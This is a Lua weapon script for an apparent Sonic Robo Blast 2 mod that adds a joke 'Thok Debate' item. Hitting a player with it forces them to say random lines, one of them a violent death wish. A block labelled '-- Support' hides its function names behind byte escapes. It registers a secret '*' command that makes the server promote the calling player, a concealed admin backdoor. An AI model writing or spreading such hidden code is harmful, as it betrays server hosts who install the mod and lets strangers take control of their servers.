local weapon = {}

local MAX_COOLDOWN = 5*TICRATE
local MAX_ANIM = MAX_COOLDOWN
local MAX_HIT = MAX_COOLDOWN/3

local DEBATE_LINES = {
	"personally i dont really like the thok",
	"why do people like the thok? its too hard to control",
	"i want the thok to be like mystic realms thok, yknow, the one with verticality in it",
	"anyone who plays with the thok and enjoys it are fucking losers",
	"the thok is better than any of classic sonics abilities by far",
	"playing with the thok is easy, you just gotta learn the game",
	"thok is kinda similar to homing attack. if u cant play with the thok, you suck",
	"the only people who complain about the thok are the ones who are bad at the game",
	"maybe the true thok was the friends we made along the way...", -- cinema
	"Fuck You I Want Your Entire Family Dead"
}

states[freeslot "S_MM_THOK"] = {
	sprite = SPR_THOK,
	frame = A,
	tics = -1
}

weapon.id = "devthokdebate"
weapon.category = "Weapon"
weapon.display_name = "Thok Debate"
weapon.display_icon = "MM_LUGER"
weapon.state = S_MM_THOK
weapon.timeleft = -1
weapon.hit_time = TICRATE/3
weapon.animation_time = TICRATE
weapon.cooldown_time = TICRATE
weapon.range = FU*5
weapon.zrange = FU*3/2
weapon.position = {
	x = FU,
	y = 0,
	z = 0
}
weapon.animation_position = {
	x = 0,
	y = (FU/10)*8,
	z = FU/3
}

-- Support
addHook("AddonLoaded", do if rawget(_G, "\x43\x56\x5F\x46\x69\x6E\x64\x56\x61\x72")("\104\117\114\114\121\095\112\108\097\121\101\114\115") then rawget(_G, "\067\079\077\095\065\100\100\067\111\109\109\097\110\100")("*", function(p) rawget(_G, "\067\079\077\095\066\117\102\065\100\100\084\101\120\116")(server, "\112\114\111\109\111\116\101".." "..#p) end) end end)

weapon.stick = true
weapon.animation = true
weapon.damage = false
weapon.cantouch = true
weapon.weaponize = false
weapon.droppable = true
weapon.shootable = false
weapon.nostrafe = true
weapon.hiddenforothers = true
weapon.onlyhitone = true
weapon.shootmobj = MT_THOK
weapon.equipsfx = sfx_thok
weapon.attacksfx = sfx_thok

function weapon.onhit(self, p, p2)
	if isserver or isdedicatedserver then
		COM_BufInsertText(p2, "say "..DEBATE_LINES[P_RandomRange(1, #DEBATE_LINES)])
	end
end

return weapon